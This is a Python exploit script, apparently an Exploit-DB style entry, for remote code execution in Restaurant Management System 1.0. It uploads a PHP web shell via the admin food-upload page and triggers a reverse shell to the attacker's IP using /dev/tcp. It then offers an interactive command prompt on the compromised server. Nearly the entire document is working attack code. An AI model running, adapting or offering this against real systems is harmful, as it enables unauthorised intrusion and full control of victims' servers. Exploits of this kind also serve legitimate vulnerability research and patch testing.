#!/usr/bin/env python3
# Exploit Title: Restaurant Management System 1.0 - Remote Code Execution (RCE)
# Date: 2025-04-13
# Exploit Author: iltosec
# Vendor Homepage: https://www.sourcecodester.com/users/lewa
# Software Link: https://www.sourcecodester.com/php/11815/restaurant-management-system.html
# Version: 1.0
# Tested on: CentOS Linux 7 (Core), Apache 2.4.6, PHP 5.4.16
# CVE: N/A

import requests
import sys
import readline

def print_banner():
    print("""
    ***************************************
    *        Remote Code Execution       *
    *    Restaurant Management System    *
    *            Exploit v1.0           *
    *         Created by: iltosec        *
    ***************************************
    """)

def upload_shell(target_url, attacker_ip, attacker_port, proxy=None):
    upload_url = f"{target_url}/admin/foods-exec.php"
    shell_name = "reverse_shell.php"
    payload = '<?php echo shell_exec($_GET["cmd"]); ?>'

    files = {
        'photo': (shell_name, payload, 'text/html'),
        'Submit': (None, 'Add')
    }

    headers = {
        "User-Agent": "Mozilla/5.0",
        "Referer": f"{target_url}/admin/foods.php",
        "Connection": "close"
    }

    print("[+] Uploading shell...")
    try:
        response = requests.post(upload_url, headers=headers, files=files, proxies=proxy, verify=False, allow_redirects=True)

        if response.status_code == 200:
            print("[+] Server Response Code:", response.status_code)
            shell_url = f"{target_url}/images/{shell_name}"
            print(f"[+] Shell uploaded at: {shell_url}")

            reverse_shell_url = f"{shell_url}?cmd=sh%20-i%20>&%20/dev/tcp/{attacker_ip}/{attacker_port}%200>&1"
            print(f"[+] Attempting reverse shell: {reverse_shell_url}")
            requests.get(reverse_shell_url, proxies=proxy, verify=False)

            return shell_url
        else:
            print("[-] Shell upload failed.")
            print("[+] Server Response Code:", response.status_code)
            print("[+] Server Response:", response.text)
            return None

    except requests.exceptions.RequestException as e:
        print(f"[-] Upload error: {e}")
        return None


def execute_commands(shell_url):
    print("[*] Type 'exit' or 'quit' to leave the shell.\n")

    current_dir = ""

    while True:
        try:
            cmd = input("cmd> ")

            if cmd.strip().lower() in ["exit", "quit"]:
                print("[+] Exiting.")
                break

            if cmd.strip().startswith("cd "):
                current_dir = cmd.strip()[3:]
                continue  

            full_cmd = f"cd {current_dir} && {cmd}" if current_dir else cmd

            response = requests.get(shell_url, params={"cmd": full_cmd})
            print(response.text)
        except requests.exceptions.RequestException as e:
            print(f"[-] Error executing command: {e}")
            break
        except KeyboardInterrupt:
            print("\n[+] Ctrl+C detected, exiting.")
            break


def main():
    print_banner()

    if len(sys.argv) != 4:
        print(f"Usage: python {sys.argv[0]} <target_url> <attacker_ip> <attacker_port>")
        print(f"Example: python {sys.argv[0]} https://example.com 10.10.14.5 4444")
        sys.exit(1)

    target_url = sys.argv[1].rstrip("/")
    attacker_ip = sys.argv[2]
    attacker_port = sys.argv[3]

    proxy = {
        "http": "http://127.0.0.1:8080",
        "https": "https://127.0.0.1:8080"
    }

    shell_url = upload_shell(target_url, attacker_ip, attacker_port, proxy=proxy)

    if shell_url:
        execute_commands(shell_url)

if __name__ == "__main__":
    main()
